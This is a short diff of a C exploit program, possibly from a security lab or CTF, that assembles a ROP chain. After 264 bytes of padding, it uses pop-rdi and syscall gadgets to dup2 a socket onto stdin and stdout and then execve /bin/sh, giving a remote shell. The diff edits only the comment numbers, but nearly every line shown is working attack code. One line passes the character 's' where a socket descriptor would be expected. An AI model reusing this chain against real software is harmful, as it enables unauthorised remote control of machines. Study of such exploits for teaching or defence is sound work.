@@ -49,7 +49,7 @@ int main(int argc, char *argv[])
   memset(exploit, 0, sizeof(exploit));
   ptr += 264;
 
-  // dup2(s, 0): 35
+  // dup2(s, 0): 56
   *(size_t *)(ptr) = POP_RDI_RET_ADDR; // pop %rdi; ret
   ptr += 8;
   *(size_t *)(ptr) = 's';
@@ -65,7 +65,7 @@ int main(int argc, char *argv[])
   *(size_t *)(ptr) = SYSCALL_RET_ADDR; // insts: syscall
   ptr += 8;
 
-  // dup2(s, 1): 35
+  // dup2(s, 1): 56
   *(size_t *)(ptr) = POP_RDI_RET_ADDR; // pop %rdi; ret
   ptr += 8;
   *(size_t *)(ptr) = 's';
@@ -81,7 +81,7 @@ int main(int argc, char *argv[])
   *(size_t *)(ptr) = SYSCALL_RET_ADDR; // insts: syscall
   ptr += 8;
 
-  // execve("/bin/sh", 0, 0): 51
+  // execve("/bin/sh", 0, 0): 72
   *(size_t *)(ptr) = POP_RDI_RET_ADDR; // pop %rdi; ret
   ptr += 8;
   *(size_t *)(ptr) = BIN_SH_ADDR; // address of "/bin/sh"
